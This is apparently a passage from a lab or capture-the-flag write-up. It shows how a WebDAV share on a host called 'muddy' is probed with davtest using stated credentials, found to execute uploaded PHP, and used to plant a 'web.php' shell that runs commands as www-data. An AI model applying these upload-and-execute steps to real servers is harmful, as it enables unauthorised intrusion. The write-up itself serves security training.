# 5 :80 webdav

```
http://192.168.197.161/webdav/
# only the passwd.dav file

# exploring webdav more
$ davtest -url http://muddy.ugc/webdav/ -auth administrant:sleepless -cleanup
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://muddy.ugc/webdav
********************************************************
NOTE    Random string for this session: Blw25u
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://muddy.ugc/webdav/DavTestDir_Blw25u
********************************************************
 Sending test files
PUT     shtml   SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.shtml
PUT     aspx    SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.aspx
PUT     asp     SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.asp
PUT     pl      SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.pl
PUT     txt     SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.txt
PUT     jsp     SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.jsp
PUT     cfm     SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.cfm
PUT     jhtml   SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.jhtml
PUT     php     SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.php
PUT     html    SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.html
PUT     cgi     SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.cgi
********************************************************
 Checking for test file execution
EXEC    shtml   FAIL
EXEC    aspx    FAIL
EXEC    asp     FAIL
EXEC    pl      FAIL
EXEC    txt     SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.txt
EXEC    jsp     FAIL
EXEC    cfm     FAIL
EXEC    jhtml   FAIL
EXEC    php     SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.php
EXEC    html    SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u/davtest_Blw25u.html
EXEC    cgi     FAIL
********************************************************
 Cleaning up
DELETE          SUCCEED:        http://muddy.ugc/webdav/DavTestDir_Blw25u

# php files are uploaded and executed

$ davtest -url http://muddy.ugc/webdav/ -auth administrant:sleepless -uploadfile web.php -uploadloc web.php                                                                                                                           130 ⨯
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://muddy.ugc/webdav
********************************************************
 unless  Uploading file
Upload succeeded: http://muddy.ugc/webdav/web.php

http://192.168.197.161/webdav/web.php
# got shell

CMD:whoami;id;hostname;uname -a
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
muddy
Linux muddy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
```
